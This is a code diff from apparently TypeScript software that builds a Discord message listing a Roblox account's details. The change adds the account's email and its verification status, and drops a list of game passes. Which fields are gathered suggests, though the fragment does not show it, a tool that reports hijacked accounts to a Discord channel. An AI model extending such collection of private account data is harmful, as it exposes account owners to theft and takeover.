@@ -720,21 +720,9 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.following} Following`, value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: `${EMOJI.voice} Voice Chat`, value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
+      { name: `${EMOJI.email} Email`, value: roblox.email ? `${roblox.email} ${roblox.emailVerified ? "✅ Verified" : "❌ Unverified"}` : (roblox.emailVerified === null ? "Unknown" : "❌ None set"), inline: true },
       { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
     );
-
-    // Tracked game passes — one field per game, listing each pass ✅/❌
-    for (const g of roblox.ownedPasses) {
-      if (g.passes.length === 0) continue;
-      const ownedCount = g.passes.filter((p) => p.owned).length;
-      mainFields.push({
-        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
-        value: g.passes
-          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
-          .join("\n"),
-        inline: true,
-      });
-    }
 
     // Owned groups — chunked to 1024 chars per field
     if (roblox.ownedGroups.length > 0) {
